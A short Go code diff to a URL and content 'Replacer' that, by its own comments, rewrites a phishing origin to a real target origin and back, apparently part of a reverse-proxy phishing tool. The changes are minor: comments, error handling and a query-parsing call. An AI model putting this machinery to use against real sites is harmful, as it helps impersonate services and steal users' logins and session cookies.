@@ -47,8 +47,7 @@ type Base64 struct {
 	Padding []string
 }
 
-//
-// Transform:
+// Transform
 // If used with forward=true, Transform uses Replacer to replace all occurrences of the phishing origin, the external domains defined,
 // as well as the rest of the data to be replaced defined in MakeReplacements(), with the target real origin.
 // If used with forward=false, Transform will replace data coming from the targeted origin
@@ -198,15 +197,23 @@ func transformBase64(input string, b64 Base64, decode bool) (output string, base
 	return input, base64Found
 }
 
+// TODO rename me to a more appropriate name . .it's not always URL we transform here, see cookies
 func (r *Replacer) transformUrl(URL string, base64 Base64) (result string, err error) {
 	result = r.Transform(URL, true, base64)
 
+	// After initial transformation round.
+	// If the input is a valid URL proceed by tranforming also the query string
+
 	hURL, err := url.Parse(result)
 	if err != nil || hURL.Scheme == "" || hURL.Host == "" {
+		// Not valid URL, but continue anyway it might be the case of different values.
+		// Log the error and reset its value
+		// log.Debug("Error while url.Parsing: %s\n%s", result, err)
+		err = nil
 		return
 	}
 
-	query, err := url.ParseQuery(hURL.RawQuery)
+	query, err := core.ParseQuery(hURL.RawQuery)
 	if err != nil {
 		return
 	}
@@ -218,7 +225,6 @@ func (r *Replacer) transformUrl(URL string, base64 Base64) (result string, err e
 	}
 	hURL.RawQuery = query.Encode()
 	result = hURL.String()
-
 	return
 }
 
